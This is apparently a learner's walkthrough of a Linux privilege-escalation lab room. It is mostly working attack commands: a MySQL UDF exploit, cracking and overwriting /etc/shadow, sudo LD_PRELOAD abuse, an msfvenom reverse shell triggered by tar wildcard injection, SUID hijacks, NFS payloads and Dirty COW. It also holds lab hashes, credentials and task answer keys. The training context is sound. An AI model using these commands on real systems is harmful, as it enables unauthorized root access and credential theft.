# Linux PrivEsc Room
# Completed 15:32 31 DEC 21
# Donkeyk0ng787/Gnome787

# MY IP - 10.4.24.252
# BOX IP - 10.10.218.143

# Creds

	user:password321
	root:password123
	
# Task 2 - Service Exploits

	Given mysql is running as a root user and the "root" user for this service does not have a password assigned to it, we can 
	use a popular exploit "MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)" to run system commands
	as root via the MYSQL service.
	
	For this we compile the exploit code by doing the following
	gcc -g -c raptor_udf2.c -fPIC
	gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc 
	
	From there, we want to connect to the mysql service as root by doing
	mysql -u root
	
	From here we want to execute the following commands on the mysql shell to create a User Defined Function "do_system" using our compiled exploit
	use mysql;
	create table foo(line blob);
	insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
	select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
	create function do_system returns integer soname 'raptor_udf2.so';
	
	We then want to copy /bin/bash to /tmp/rootbash and set the SUID permission to the "do_system" function
	select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
	
	We can then exit out of the mysql shell and run the rootbash executable with -p to gain a root shell
	/tmp/rootbash -p
	
	If you wish to remove the rootbash executable you would simply do
	rm /tmp/rootbash
	
# Task 3 - Weak File Permissions Readable /etc/shadow

	The /etc/shadow file contains user password hashes and is usually readable only by the root user
	Sometimes developers misconfigure aspects of their machines. One such area is file permissions
	This is the case for the /etc/shadow file on our machine as it is world readable
	By doing the following command we can display the files permissions
	ls -l /etc/shadow
	
	To read the file we simple do
	cat /etc/shadow
	
	From this we can see the password hashes for those accounts that have them
	We can then use a tool such as hashcat or john the ripper to crack the hash and then we have that users account access
	
	In this case we will use john with the following parameters
	john hash.txt -w=/usr/share/wordlists/rockyou.txt
	
	This gives us an output of 'password123'
	
	We can then switch to the root user by doing
	su root
	and then entering the password we just cracked
	
	Question Answers
		'$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0'
		'sha512crypt'
		'password123'
	
# Task 4 - Weak File Permissions Writable /etc/shadow

	Continuing on from the last task, our machine also allows for global writing to the /etc/shadow file which 
	is a major issue since it allows us as an attacker to change any accounts password (including the root account).
	
	To do this we first want to generate a password hash with a password of our choice like so
	mkpasswd -m sha-512 bill123
	
	This gives us a hash of
	$6$ofI3Nady$1j2M7I7idqAU99OUc8zRoWZYPupuSNFDTa5ng1ziSmj9Ulft3EHAD42sbmEWrY0Qp/bqI9Ma2dk5to8R.J9gv1
	
	From here we can edit the /etc/shadow file and replace the root accounts password hash with our newly generated one
	This can be achieved with a text editor such as vim or nano
	
	Again using the command 
	su root
	we can gain access with our new password of 'bill123'
	
# Task 5 - Weak File Permissions Writable /etc/passwd

	The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. 
	Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.
	
	Similarly as with the /etc/shadow file, we can edit the /etc/passwd file and add a new user
	
	Question Answers
		'uid=0(root) gid=0(root) groups=0(root)'
		
# Task 6 - Sudo Shell Escape Sequences

	On a linux machine you can list all the processes a user can run as sudo by doing the following
	sudo -l
	
	From here you can visit GTFOBins and try and find a program name you can run as sudo on there
	If you can simply follow the instructions on that site which will help you exploit the target through the use of that binary
	
	Question Answers
		'11'
		'Apache2'
		
# Task 7 - Sudo Environment Values

	Sudo can be configured to inherit certain environment variables from the user's environment.

	Check which environment variables are inherited (look for the env_keep options):

	sudo -l

	LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries 		are searched for first.

	Create a shared object using the code located at /home/user/tools/sudo/preload.c:

	gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

	Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

	sudo LD_PRELOAD=/tmp/preload.so program-name-here

	A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

	Run ldd against the apache2 program file to see which shared libraries are used by the program:

	ldd /usr/sbin/apache2

	Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

	gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

	Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

	sudo LD_LIBRARY_PATH=/tmp apache2

	A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the 		library_path.c code could be changed to make it work.
	
# Task 8 - Cron Jobs File Permissions

	Crons jobs are simply scripts that have been scheduled to run at specific times. A Cron Table file (crontabs) store the configuration for cron jobs which is stored @ /etc/crontab
	
	If a cron job file is configured in such a way that the account you have access to can write to it, then you can edit the file and add some bash code to send a reverse shell to a netcat session on your machine
	
	This shell of course will be a root shell because cron jobs must run as root given they perform functions on the system
	
# Task 9 - Cron Jobs PATH Environment Variable

	Question Answers
		'PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin'
		
# Task 10 - Cron Jobs Wildcards

	View the contents of the other cron job script:

	cat /usr/local/bin/compress.sh

	Note that the tar command is being run with a wildcard (*) in your home directory.

	Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.

	Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

	msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

	Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

	chmod +x /home/user/shell.elf

	Create these two files in /home/user:

	touch /home/user/--checkpoint=1
	touch /home/user/--checkpoint-action=exec=shell.elf

	When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options 		rather than filenames.

	Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

	nc -nvlp 4444

	Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:

	rm /home/user/shell.elf
	rm /home/user/--checkpoint=1
	rm /home/user/--checkpoint-action=exec=shell.elf
	
# Task 11 - SUID/SGID Executables Known Exploits

	Using the following command you can find all the SUID/SGID's on the system
	find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
	
	From here you can look through the results and then try and find an exploit online
	
	In the case of our machine, we can use a Local Privilege Escalation exploit for /usr/sbin/exim-4.84-3
	
	In an actual pentest we would use wget or curl to get the exploit on our system but this one already has it on there for us
	
	We simply run the script and it puts us in a root shell
	
# Task 12 - SUID/SGID Executables Shared Object Injection

	The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.

	First, execute the file and note that currently it displays a progress bar before exiting:

	/usr/local/bin/suid-so

	Run strace on the file and search the output for open/access calls and for "no such file" errors:

	strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

	Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

	Create the .config directory for the libcalc.so file:

	mkdir /home/user/.config

	Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

	gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c

	Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.

	/usr/local/bin/suid-so
	
# Task 13 - SUID/SGID Executables Environment Variables

	The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

	First, execute the file and note that it seems to be trying to start the apache2 webserver:

	/usr/local/bin/suid-env

	Run strings on the file to look for strings of printable characters:

	strings /usr/local/bin/suid-env

	One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

	Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:

	gcc -o service /home/user/tools/suid/service.c

	Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

	PATH=.:$PATH /usr/local/bin/suid-env
	
# Task 14 - SUID/SGID Executables Abusing Shell Features (#1)

	The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

	Verify this with strings:

	strings /usr/local/bin/suid-env2

	In Bash versions less than 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

	Verify the version of Bash installed on the Debian VM is less than 4.2-048:

	/bin/bash --version

	Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

	function /usr/sbin/service { /bin/bash -p; }
	export -f /usr/sbin/service

	Run the suid-env2 executable to gain a root shell:

	/usr/local/bin/suid-env2
	
# Task 15 - SUID/SGID Executables Abusing Shell Features (#2)

	Note: This will not work on Bash versions 4.4 and above.

	When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

	Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

	env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

	Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

	/tmp/rootbash -p

	Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

	rm /tmp/rootbash
	exit
	
# Task 16 - Password & Keys History Files

	Sometimes users make mistakes and type things into the command line they didn't mean to
	
	In this case we can look at the hidden history files in the user's home directory to see what they have typed into the command line
	
	cat ~/.*history | less
	
	In our case we see a command used to login to the mysql database as the root user
	
	Question Answers
		'mysql -h somehost.local -uroot -ppassword123'
		
# Task 17 - Password & Keys Config Files

	Config files often contain passwords in plaintext or other reversible formats
	
	Question Answers
		'/etc/openvpn/auth.txt'
		
# Task 18 - Password & Keys SSH Keys

	It is possible, sometimes, to come across important files that haven't been properly secured with the correct permissions
	This can lead to an attacker being able to get root user ssh keys
	
	You can look for hidden files & directories in the system root by doing
	ls -la /
	
	Our machine has a '.ssh' directory, lets take a look by doing
	ls -l /.ssh
	
	It contains a root ssh key which we can grab, use 'chmod 600 root_key' to give it the necessary file permissions and then access the root ssh account
	
# Task 19 - NFS

	Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

	Check the NFS share configuration on the Debian VM:

	cat /etc/exports

	Note that the /tmp share has root squashing disabled.

	On your Kali box, switch to your root user if you are not already running as root:

	sudo su

	Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

	mkdir /tmp/nfs
	mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs

	Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):

	msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

	Still using Kali's root user, make the file executable and set the SUID permission:

	chmod +xs /tmp/nfs/shell.elf

	Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

	/tmp/shell.elf
	
	Question Answers
		'no_root_squash'
		
# Task 20 - Kernel Exploits

	Before we proceed, its important to note that kernel exploits can cause system instability so they should only be used as a last resort
	
	Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:

	perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

	The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a     	shell (a backup of /usr/bin/passwd is made at /tmp/bak).

	Compile the code and run it (note that it may take several minutes to complete):

	gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
	./c0w

	Once the exploit completes, run /usr/bin/passwd to gain a root shell:

	/usr/bin/passwd

	Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!

	mv /tmp/bak /usr/bin/passwd
	exit

# Task 21 - Privilege Escalation Scripts

	There are 3 useful scripts on this machine that can be helpful for privilege escalation
	linpeas
	linenum
	linnux smart enumeration (lse)
	
	
	